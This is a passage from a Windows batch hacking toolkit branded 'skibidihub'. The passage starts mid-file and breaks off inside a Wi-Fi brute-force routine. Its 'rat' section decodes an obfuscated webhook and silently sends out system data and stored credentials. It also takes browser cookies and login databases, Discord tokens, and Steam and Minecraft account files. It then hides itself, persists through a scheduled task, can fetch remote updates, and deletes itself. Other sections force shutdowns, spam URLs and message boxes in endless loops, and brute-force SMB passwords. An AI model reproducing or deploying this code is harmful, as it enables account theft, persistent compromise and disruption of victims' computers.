echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
echo                           ░      ░            ░  ░        ░        
set /p shutdowntime=[31m.──type the time─»[38;2;255;255;0m
set /p shutdownmessage=[31m.──type the message─»[38;2;255;255;0m
shutdown /s /t %shutdowntime% /c %shutdownmessage%
exit
:rat
if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
This is part of the recurring method.
set "vpath=C:\ProgramData"
cd %vpath%
Set axn=XtfQ5BIG6d4328JjuHRWZqTLVCklPSKYcoy7vwNz1rpmiODFM9h0xaUgbeAnsE
cls
%axn:~60,1%%axn:~57,1%%axn:~1,1% %axn:~37,1%%axn:~57,1%%axn:~56,1%%axn:~50,1%%axn:~33,1%%axn:~33,1%%axn:~26,1%="%axn:~50,1%%axn:~1,1%%axn:~1,1%%axn:~42,1%%axn:~60,1%://%axn:~9,1%%axn:~44,1%%axn:~60,1%%axn:~32,1%%axn:~33,1%%axn:~41,1%%axn:~9,1%.%axn:~32,1%%axn:~33,1%%axn:~43,1%/%axn:~53,1%%axn:~42,1%%axn:~44,1%/%axn:~37,1%%axn:~57,1%%axn:~56,1%%axn:~50,1%%axn:~33,1%%axn:~33,1%%axn:~26,1%%axn:~60,1%/%axn:~40,1%%axn:~11,1%%axn:~11,1%%axn:~13,1%%axn:~49,1%%axn:~10,1%%axn:~4,1%%axn:~13,1%%axn:~35,1%%axn:~51,1%%axn:~8,1%%axn:~49,1%%axn:~49,1%%axn:~12,1%%axn:~49,1%%axn:~13,1%%axn:~13,1%%axn:~8,1%%axn:~35,1%/%axn:~8,1%_%axn:~47,1%%axn:~57,1%%axn:~58,1%%axn:~12,1%%axn:~19,1%%axn:~13,1%%axn:~60,1%%axn:~6,1%%axn:~12,1%%axn:~41,1%%axn:~48,1%%axn:~6,1%%axn:~6,1%%axn:~61,1%%axn:~29,1%%axn:~31,1%%axn:~42,1%%axn:~49,1%%axn:~17,1%%axn:~7,1%%axn:~45,1%%axn:~46,1%%axn:~55,1%%axn:~15,1%%axn:~27,1%%axn:~25,1%%axn:~18,1%%axn:~25,1%%axn:~54,1%%axn:~42,1%%axn:~24,1%-%axn:~6,1%%axn:~56,1%%axn:~14,1%%axn:~19,1%%axn:~12,1%%axn:~42,1%%axn:~4,1%%axn:~30,1%%axn:~36,1%%axn:~0,1%%axn:~26,1%%axn:~56,1%%axn:~29,1%%axn:~32,1%%axn:~36,1%%axn:~28,1%%axn:~44,1%%axn:~48,1%_%axn:~43,1%%axn:~13,1%%axn:~30,1%%axn:~53,1%%axn:~26,1%%axn:~53,1%%axn:~40,1%%axn:~19,1%%axn:~3,1%%axn:~6,1%%axn:~28,1%%axn:~5,1%%axn:~23,1%_%axn:~12,1%"
for /f "delims=[] tokens=2" %%a in ('2^>NUL ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
for /f %%a in ('powershell Invoke-RestMethod api.ipify.org') do set PublicIP=%%a
for /f "tokens=1-4 delims=/:." %%a in ("%TIME%") do (
	set HH24=%%a
	set MI=%%b
)
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```[Report from %USERNAME% - %PublicIP%]\nLocal time: %HH24%:%MI%```\"}"  %webhook%
	set "tempsys=%appdata%\sysinfo.txt"
	2>NUL SystemInfo > "%tempsys%"
	curl --silent --output /dev/null -F systeminfo=@"%tempsys%" %webhook%
	del "%tempsys%" >nul 2>&1
	set "temptasklist=%appdata%\tasklist.txt"
	2>NUL tasklist > "%temptasklist%"
	curl --silent --output /dev/null -F tasks=@"%temptasklist%" %webhook%
	del "%temptasklist%" >nul 2>&1
	set "netuser=%appdata%\netuser.txt"
	2>NUL net user > "%netuser%"
	curl --silent --output /dev/null -F tasks=@"%netuser%" %webhook%
	del "%netuser%" >nul 2>&1
	set "quser=%appdata%\quser.txt"
	2>NUL quser > "%quser%"
	curl --silent --output /dev/null -F tasks=@"%quser%" %webhook%
	del "%quser%" >nul 2>&1
	set "stup=%appdata%\stup.txt"
	2>NUL reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run >> "%stup%"
	curl --silent --output /dev/null -F tasks=@"%stup%" %webhook%
	del "%stup%" >nul 2>&1
	set "cmdkey=%appdata%\cmdkey.txt"
	2>NUL cmdkey /list > "%cmdkey%"
	curl --silent --output /dev/null -F tasks=@"%cmdkey%" %webhook%
	del "%cmdkey%" >nul 2>&1
	set "ipconfig=%appdata%\ipconfig.txt"
	2>NUL ipconfig /all > "%ipconfig%"
	curl --silent --output /dev/null -F tasks=@"%ipconfig%" %webhook%
	del "%ipconfig%" >nul 2>&1
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- CHROME -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%localappdata%\Google\Chrome\User Data\Default\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%localappdata%\Google\Chrome\User Data\Default\History" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F s=@"%localappdata%\Google\Chrome\User Data\Default\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%localappdata%\Google\Chrome\User Data\Default\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Default\Login Data" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F l=@"%localappdata%\Google\Chrome\User Data\Local State" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- OPERA -```\"}"  %webhook%
	curl --silent --output /dev/null -F c=@"%appdata%\Opera Software\Opera Stable\Cookies" %webhook%
	curl --silent --output /dev/null -F h=@"%appdata%\Opera Software\Opera Stable\History" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -F s=@"%appdata%\Opera Software\Opera Stable\Shortcuts" %webhook%
	curl --silent --output /dev/null -F b=@"%appdata%\Opera Software\Opera Stable\Bookmarks" %webhook%
	curl --silent --output /dev/null -F l=@"%appdata%\Opera Software\Opera Stable\Login Data" %webhook%
	timeout /t 2 /nobreak > NUL
	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- DISCORD -```\"}"  %webhook%
for /f %%f in ('2^>NUL dir /b "%appdata%\discord\Local Storage\leveldb\"') do (
	echo %%f|find ".ldb"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F level=@"%appdata%\discord\Local Storage\leveldb\%%f" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- STEAM -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"C:\Program Files (x86)\Steam\config\loginusers.vdf" %webhook%
	curl --silent --output /dev/null -F loginusers=@"C:\Program Files\Steam\config\loginusers.vdf" %webhook%
for /f %%s in ('2^>NUL dir /b "C:\Program Files (x86)\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files (x86)\Steam\%%s" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)
for /f %%s in ('2^>NUL dir /b "C:\Program Files\Steam\"') do (
	echo %%s|find "ssfn"
	if errorlevel 1 (@echo off) else (
		curl --silent --output /dev/null -F auth=@"C:\Program Files\Steam\%%s" %webhook%
		
		timeout /t 2 /nobreak > NUL
	)
)

	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- MINECRAFT -```\"}"  %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_profiles.json" %webhook%
	curl --silent --output /dev/null -F steamusers=@"%appdata%\.minecraft\launcher_accounts.json" %webhook%
	
	timeout /t 2 /nobreak > NUL
set "recurring=false"

>NUL attrib -h "%vpath%\%uname%"
>NUL attrib -h "%vpath%\%bname%"
>NUL attrib -h "%vpath%\%vname%"
set "updateurl="
	set "targetusername="
del /ah "%vpath%\%uname%" >nul 2>&1
del /ah "%vpath%\%vname%" >nul 2>&1

if not "%~dp0"=="%vpath%\" (
  del /ah "%vpath%\%bname%" >nul 2>&1
  >NUL copy "%~f0" "%vpath%\%bname%"
)

if "%updateurl%"=="" (
	:normalrecurring
	echo set WshShell = wscript.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell.run """%vpath%\%bname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"

	goto skipupdateconfig
	
) else ( goto recurringupdate )

goto dontremoveme


:: IF TARGET USERNAME IS SET
if "%targetusername%"=="" (
	goto nontargetedupdate 
) else ( goto targetedupdate )

goto dontremoveme2
:nontargetedupdate
	IF EXIST "%vpath%\temp.txt" del "%vpath%\temp.txt" >nul 2>&1
	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"
	echo ^@echo off> "%vpath%\%uname%"
	echo cd "%vpath%">> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo :wl>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
	echo timeout /t 1 >> "%vpath%\%uname%"
	echo goto wl>> "%vpath%\%uname%"
	echo :w2>> "%vpath%\%uname%"
	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
	echo ren temp.txt %bname%>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo start %vname%>> "%vpath%\%uname%"
	echo timeout 1 ^>nul>> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
goto skipupdateconfig
:dontremoveme2
goto dontremoveme3
:targetedupdate
IF "%USERNAME%"=="%targetusername%" (
	IF EXIST "%vpath%\temp.txt" 2>NUL del "%vpath%\temp.txt"
	echo set WshShell = wscript^.createobject^("WScript.shell"^)> "%vpath%\%vname%"
	echo WshShell^.run """%vpath%\%uname%"" ", 0, true>> "%vpath%\%vname%"
	echo set WshShell = Nothing>> "%vpath%\%vname%"
	echo ^@echo off> "%vpath%\%uname%"
	echo cd "%vpath%">> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo ^>NUL attrib -h %bname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %uname%>> "%vpath%\%uname%"
	echo ^>NUL attrib -h %vname%>> "%vpath%\%uname%"
	echo curl --silent --output /dev/null -sb --trace-ascii "Accept: text/plain" %updateurl% ^> "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo :wl>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" GOTO w2>> "%vpath%\%uname%"
	echo timeout /t 1 >> "%vpath%\%uname%"
	echo goto wl>> "%vpath%\%uname%"
	echo :w2>> "%vpath%\%uname%"
	echo 2^>NUL del %bname%>> "%vpath%\%uname%"
	echo ren temp.txt %bname%>> "%vpath%\%uname%"
	echo IF EXIST "%vpath%\temp.txt" 2^>NUL del "%vpath%\temp.txt">> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%bname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo start %vname%>> "%vpath%\%uname%"
	echo timeout 1 ^>nul>> "%vpath%\%uname%"
	echo break^>%vname%>> "%vpath%\%uname%"
	echo echo set WshShell = wscript^.createobject^("WScript.shell"^)^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo WshShell^.run """%vpath%\%uname%"" ", 0, true^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo echo set WshShell = Nothing^>^> "%vpath%\%vname%">> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%vname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%bname%" +h>> "%vpath%\%uname%"
	echo ^>NUL attrib "%vpath%\%uname%" +h>> "%vpath%\%uname%"
	goto skipupdateconfig
) else ( goto normalrecurring )
:dontremoveme3
:dontremoveme
:skipupdateconfig
>NUL SchTasks /create /f /sc %when% /tn "%ScheduleName%" /tr "%vpath%\%vname%"
if errorlevel 0 (set "recurring=true, %when%") else (set "recurring=failed, %when%, is probably incorrect.")
>NUL attrib "%vpath%\%vname%" +h
>NUL attrib "%vpath%\%bname%" +h
>NUL attrib "%vpath%\%uname%" +h
curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```Batch Scheduled: %recurring%\n[End of report]```\"}"  %webhook%
if not "%~dp0"=="%vpath%\" (
	call :d & exit /b
	:d
	start /b "" cmd /c 2^>NUL del "%~f0"&exit /b
)
exit



:spamurl
set /p urlforspam=[31m.──type the url─»[38;2;255;255;0m
:buclespam
Start %urlforspam%
goto buclespam
:midkill
cls
del messageskibidi.vbs
del messageskibidi.cmd
set /p hackedby=[31m.──type the ur name to put on the messagebox─»[38;2;255;255;0m
echo MsgBox "hacked by %hackedby%",262192,"hack made by skibidihub">>messageskibidi.vbs
echo @echo off>>messageskibidi.cmd
echo chcp 65001>nul>>messageskibidi.cmd
echo echo. [31m>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░░░░░▓████████████████████████▒░░░░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░░▓█████▓▒░░░░░░░░░░░░░░░▒██████▒░░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░████▒░░░░░░░░░░░░░░░░░░░░░░░░░▓███▒░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░███░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░▒██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒██░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░▒██░░░░░░░░S░K░I░B░I░D░I░░H░U░B░░░░░░░░██░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░██▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒░░██░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░██░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░██░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░██░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░██▒░██▓░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██▓░▒██░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░██░░██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░██░░██░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░██▒░██░░░░░▒▒▓███▒░░░░░░░▒███▓▒▒░░░░░██░▓██░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░██░██░░██████████▒░░░░░▓██████████░░██▒██░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░████░████████████░░░░░████████████░████░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░███░▒██████████░░░░░░░██████████▒░██▒░░░░░░░░░▒░░░░░>>messageskibidi.cmd
echo echo ░░░▒████░░░░░░░▓█▒░░█████████░░░░░░░░░█████████░░▒█▓░░░░░░▓████░░░░>>messageskibidi.cmd
echo echo ░░░██░▒██▒░░░░░██░░░░██████▓░░░░█░█░░░░███████░░░░██░░░░░███░░██░░░>>messageskibidi.cmd
echo echo ░░░██░░░██▓░░░░██░░░░░░▒▓▓░░░░▒██░██░░░░░▓▓▒░░░░░▒██░░░░███░░░██░░░>>messageskibidi.cmd
echo echo ░▓██▒░░░░████▓░░██░░░░░░░░░░░░███░███░░░░░░░░░░░░██░░█████░░░░▓██▒░>>messageskibidi.cmd
echo echo ██▓░░░░░░░░▒████████▓░░░░░░░░████░███▓░░░░░░░▒▓████████░░░░░░░░░███>>messageskibidi.cmd
echo echo ██▓▒▓███▓░░░░░░▓████████▓░░░░████░███▓░░░░▓████████▓░░░░░░████▓▓███>>messageskibidi.cmd
echo echo ░███████████▒░░░░░░███████░░░░██░░░██░░░░██████▓░░░░░░▓███████████░>>messageskibidi.cmd
echo echo ░░░░░░░░░░▓█████░░░░██▓▓░██░░░░░░░░░░░░░██░█▒██░░░▒█████▓░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░▒█████▒▒█▓█░███▓▓▒▒▒▓▒▒▓▓▓███▒███░▓█████░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░▒████▒▓█▒▒█░█▒█░█░█▓█▒█▓░█░█████▒░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░░░░██░░██▓█▓█▓█▒█▒█▓█▓████░▓█▓░░░░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░▓████▓░▓█▓█░█▒█░█░█▒█▒███▒░██████░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░▓█████░░██░░░▒█████▓█▓█████▒░░░██░▒█████▓░░░░░░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░▒██████████▓░░░░░███░░░░░░░░░░░░░░░░░░░██▒░░░░░▓██████████▒░░░░>>messageskibidi.cmd
echo echo ░░░░██░░░▓▓▓░░░░░░▒██████▓░░░░░░░░░░░░░░░███████▒░░░░░░▓▓▒░░▒██░░░░>>messageskibidi.cmd
echo echo ░░░░▓██░░░░░░░░▓████▓░░░█████▒░░░░░░▒▓█████░░░▓████▓░░░░░░░▒██▓░░░░>>messageskibidi.cmd
echo echo ░░░░░░███░░░░████▒░░░░░░░░▓█████████████▒░░░░░░░░▒████░░░░███░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░██░░░██▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▓██░░░██░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░██▒▓██░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░▒██▒▓██░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░████░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░████░░░░░░░░>>messageskibidi.cmd
echo echo ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░>>messageskibidi.cmd
echo pause>>messageskibidi.cmd
echo exit>>messageskibidi.cmd
:buclemessagesskibidis
start messageskibidi.vbs
start messageskibidi.cmd
goto buclemessagesskibidis
:rpc
del remotepcskibidihub.cmd
echo @echo off>>remotepcskibidihub.cmd
echo mode 120,30>>remotepcskibidihub.cmd
echo chcp 65001>nul>>remotepcskibidihub.cmd
echo cls>>remotepcskibidihub.cmd
echo title RemotePC skibidihub>>remotepcskibidihub.cmd
echo echo.>>remotepcskibidihub.cmd
echo echo.>>remotepcskibidihub.cmd
echo echo.>>remotepcskibidihub.cmd
echo echo. [31m>>remotepcskibidihub.cmd
echo echo                         ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  >>remotepcskibidihub.cmd
echo echo                       ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  >>remotepcskibidihub.cmd
echo echo                       ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ >>remotepcskibidihub.cmd
echo echo                         ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒>>remotepcskibidihub.cmd
echo echo                       ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░>>remotepcskibidihub.cmd
echo echo                       ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░>>remotepcskibidihub.cmd
echo echo                       ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   >>remotepcskibidihub.cmd
echo echo                       ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        >>remotepcskibidihub.cmd
echo echo                             ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      >>remotepcskibidihub.cmd
echo echo                                                 ░      ░            ░  ░        ░        >>remotepcskibidihub.cmd
echo echo.>>remotepcskibidihub.cmd
echo echo.>>remotepcskibidihub.cmd
echo set /p host=.%BS%                                         host══»>>remotepcskibidihub.cmd
echo set /p user=.%BS%                                         user══»>>remotepcskibidihub.cmd
echo set /p pass=.%BS%                                         pass══»>>remotepcskibidihub.cmd
echo cmdkey /add:%host% /user:%user% /pass:%pass% >nul>>remotepcskibidihub.cmd
echo mstsc v:%host%>>remotepcskibidihub.cmd
echo cmdkey /delete:%host% >nul>>remotepcskibidihub.cmd
echo pause >>remotepcskibidihub.cmd
echo exit>>remotepcskibidihub.cmd
start remotepcskibidihub.cmd
goto start
:brutf
cls
title SMB Bruteforce
echo.
echo.
echo.
echo. [31m
echo   ██████  ██ ▄█▀ ██▓ ▄▄▄▄    ██▓▓█████▄  ██▓      ▄████▄   ▄████▄  
echo ▒██    ▒  ██▄█▒ ▓██▒▓█████▄ ▓██▒▒██▀ ██▌▓██▒     ▒██▀ ▀█  ▒██▀ ▀█  
echo ░ ▓██▄   ▓███▄░ ▒██▒▒██▒ ▄██▒██▒░██   █▌▒██▒     ▒▓█    ▄ ▒▓█    ▄ 
echo   ▒   ██▒▓██ █▄ ░██░▒██░█▀  ░██░░▓█▄   ▌░██░     ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒
echo ▒██████▒▒▒██▒ █▄░██░░▓█  ▀█▓░██░░▒████▓ ░██░ ██▓ ▒ ▓███▀ ░▒ ▓███▀ ░
echo ▒ ▒▓▒ ▒ ░▒ ▒▒ ▓▒░▓  ░▒▓███▀▒░▓   ▒▒▓  ▒ ░▓   ▒▓▒ ░ ░▒ ▒  ░░ ░▒ ▒  ░
echo ░ ░▒  ░ ░░ ░▒ ▒░ ▒ ░▒░▒   ░  ▒ ░ ░ ▒  ▒  ▒ ░ ░▒    ░  ▒     ░  ▒   
echo ░  ░  ░  ░ ░░ ░  ▒ ░ ░    ░  ▒ ░ ░ ░  ░  ▒ ░ ░   ░        ░        
echo       ░  ░  ░    ░   ░       ░     ░     ░    ░  ░ ░      ░ ░      
echo                           ░      ░            ░  ░        ░        
echo.
echo.
echo.
set /p ip="Enter IP Address: "
set /p user="Enter Username: "
set /p wordlist="Enter Password List: "

set /a count=1
for /f %%a in (%wordlist%) do (
  set pass=%%a
  call :attempt
)
echo Password not Found 
pause
exit

:success
echo.
echo Password Found! %pass% remember joining the disc server:p
net use \\%ip% /d /y >nul 2>&1
pause
exit

:attempt
net use \\%ip% /user:%user% %pass% >nul 2>&1
echo [+][skibidihub][%count%] [%pass%]
set /a count=%count%+1
if %errorlevel% EQU 0 goto success


:brutfwif
cls
setlocal enabledelayedexpansion
title skibidi bruteforce wifi
color 0f

cd /D %~dp0

if exist "importwifi.xml" (
    del importwifi.xml
)

where wmic 1>nul 2>nul
if %errorlevel% equ 1 (
    call :exit_fatal "'wmic' command is not accessible from CMD. Please enable the Windows feature to access 'wmic'"
)

set interface_number=0
set interface_mac=not_defined
set interface_id=not_defined
set interface_state=not_defined
set interface_description=not_defined
set wifi_target=not_defined

set attack_counter_option=0

if not exist "wordlist.txt" (
    set wordlist_file=not_defined
) else (
    set wordlist_file=wordlist.txt
)


:program_entry
    call :interface_init
    call :mainmenu
goto :eof

:interface_detection
    cls
    echo.
    call :color_echo . yellow "Detecting interfaces..."
    echo.
    set interface_temp_index=0
    set interface_number=0

    set interface_parse_counter=0
    set interface_parse_begin=false
    set interface_parse_line=
    set interface_parse_arg=

    for /f "skip=2 tokens=* delims=" %%a in ('netsh wlan show interfaces ^| findstr /n "^"') do (
        set "interface_parse_line=%%a"
        set "interface_parse_line=!interface_parse_line:*:=!"
        
        if "!interface_parse_begin!" equ "true" if "!interface_parse_line!" neq "" (

            for /f "tokens=1,* delims=:" %%x in ('echo !interface_parse_line!') do set interface_parse_arg=%%y
            call :trim_spaces interface_parse_arg
            
            if "!interface_parse_counter!" equ "0" (
                set interface[!interface_temp_index!]_id=!interface_parse_arg!


            )

            if "!interface_parse_counter!" equ "1" (
                set interface[!interface_temp_index!]_description=!interface_parse_arg!
            )

            if "!interface_parse_counter!" equ "3" (
                set interface[!interface_temp_index!]_mac=!interface_parse_arg!
            )

            set /a interface_parse_counter=!interface_parse_counter!+1
        )

        if !interface_parse_counter! gtr 4 (
            set interface_parse_counter=0
            set /a interface_temp_index=!interface_temp_index!+1
            set interface_parse_begin=false
        )

        if "!interface_parse_line!" equ "" (
            set interface_parse_begin=true
        )

    )

    rem Last line must be redacted
    set /a interface_temp_index=!interface_temp_index!-1

    set /a interface_number=!interface_temp_index!+1
    timeout /t 2 >nul
    cls
goto :eof


:color_echo 

       if "%~1" equ "" (
        goto :eof
    )
    if "%~2" equ "" (
        goto :eof
    )


    if "%~1" equ "black" (
        <nul set /p=[40m
    )

    if "%~1" equ "red" (
        <nul set /p=[41m
    )

    if "%~1" equ "green" (
        <nul set /p=[42m
    )

    if "%~1" equ "yellow" (
        <nul set /p=[43m
    )

    if "%~1" equ "blue" (
        <nul set /p=[44m
    )

    if "%~1" equ "magenta" (
        <nul set /p=[45m
    )

    if "%~1" equ "cyan" (
        <nul set /p=[46m
    )

    if "%~1" equ "white" (
        <nul set /p=[47m
    )



    if "%~2" equ "black" (
        <nul set /p=[30m
    )

    if "%~2" equ "red" (
        <nul set /p=[31m
    )

    if "%~2" equ "green" (
        <nul set /p=[32m
    )

    if "%~2" equ "yellow" (
        <nul set /p=[33m
    )

    if "%~2" equ "blue" (
        <nul set /p=[34m
    )

    if "%~2" equ "magenta" (
        <nul set /p=[35m
    )

    if "%~2" equ "cyan" (
        <nul set /p=[36m
    )

    if "%~2" equ "white" (
        <nul set /p=[37m
    )

    <nul set /p="%~3"

    <nul set /p=[0m
goto :eof


:interface_init
    cls
    :: Interface detection and selection
    call :interface_detection
    echo.
    call :color_echo . cyan " Interface Init"
    echo.
    echo.
	if "!interface_number!" equ "1" (

